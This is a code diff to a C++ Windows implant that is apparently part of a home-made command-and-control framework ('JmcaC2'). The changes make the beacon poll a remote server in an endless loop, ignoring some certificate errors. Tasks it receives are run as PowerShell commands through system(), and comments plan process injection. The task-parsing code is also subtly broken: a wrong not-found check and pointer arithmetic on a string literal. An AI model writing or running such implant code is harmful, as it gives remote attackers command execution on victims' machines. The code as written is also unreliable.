@@ -18,6 +18,20 @@ bool sendHTTPTaskResult();
 
 static std::wstring beaconName = L"";
 
+bool runTask(std::string outBuffer, DWORD dwSize) {
+    printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());
+
+    size_t pipePos = outBuffer.find('|');
+
+    if (!pipePos) return false;
+
+    std::string cmd = outBuffer.substr(0, pipePos);
+
+    if (cmd == "powershell")
+        runPSCommand(outBuffer.substr(outBuffer.find("|" + 1)));
+    return true;
+}
+
 bool PrintWinHttpError(const char* msg) {
     std::cout << msg << " failed: " << GetLastError() << "\n";
     return false;
@@ -27,15 +41,13 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     // WinHTTP > WinINet
 
     /*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
-    WinHttpAddRequestHeaders (user-agent/content-type) ->
+    WinHttpSetOption (user-agent/content-type) ->
     WinHttpSendRequest -> WinHttpReadData -> TASK -> Close / cleanup*/
 
     // https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/WinHttp/winhttp-sessions-overview.md#using-the-winhttp-api-to-access-the-web
 
     HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
     bool isRequestSuccessful{}, didReceiveResponse{};
-
-    // SYNCHRONOUS (blocking)
 
     if (!(hHTTPSession = WinHttpOpen(
               L"JmcaC2 Task Fetching", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
@@ -48,9 +60,8 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
 
     if (!(hHTTPRequest = WinHttpOpenRequest(
               hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
-              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE))) {
+              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
         return PrintWinHttpError("WinHttpOpenRequest");
-    }
 
     std::cout << "Request Sent" << std::endl;
 
@@ -59,9 +70,8 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
 
     if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
-                          sizeof(flags))) {
-        PrintWinHttpError("WinHttpSetOption");
-    }
+                          sizeof(flags)))
+        return PrintWinHttpError("WinHttpSetOption");
 
     std::wstring headerString;
     LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;
@@ -104,6 +114,7 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     }
 
     DWORD dwSize = 0;
+
     while (true) {
         if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize) break;
         char* responseBuf = new char[dwSize + 1];
@@ -137,9 +148,10 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     return didReceiveResponse;
 }
 
-void runPSCommand(string command) {
+void runPSCommand(std::string command) {
     string powershellPrefix{"powershell -c "};
     system((powershellPrefix + command).c_str());
+
     // TODO: Make this process injection?
 }
 
@@ -160,22 +172,23 @@ int main(int argc, const char** argv) {
     char* outBuffer = nullptr;
     DWORD dwSize = 0;
 
-    // while (true) {
-    if (fetchTasks(&outBuffer, &dwSize)) {
-        // TODO: parse tasks and do
-        if (dwSize > 0) {
-            printf("TASK: %.*s\n", dwSize, outBuffer);
-            delete[] outBuffer;
-            dwSize = 0;
+    while (true) {
+        if (fetchTasks(&outBuffer, &dwSize)) {
+            // TODO: parse tasks and do
+            if (dwSize > 0) {
+                runTask(outBuffer, dwSize);
+                // printf("TASK: %.*s\n", dwSize, outBuffer);
+                delete[] outBuffer;
+                dwSize = 0;
+            }
+            // processInject();
+            // runPSCommand(argv[1]);
+            //  TODO: post results
         }
-        // processInject();
-        // runPSCommand(argv[1]);
-        //  TODO: post results
-    }
 
-    // TODO: jitter sleep interval
-    Sleep(5000);
-    // }
+        // TODO: jitter sleep interval
+        Sleep(10000);
+    }
 
     return 0;
 }
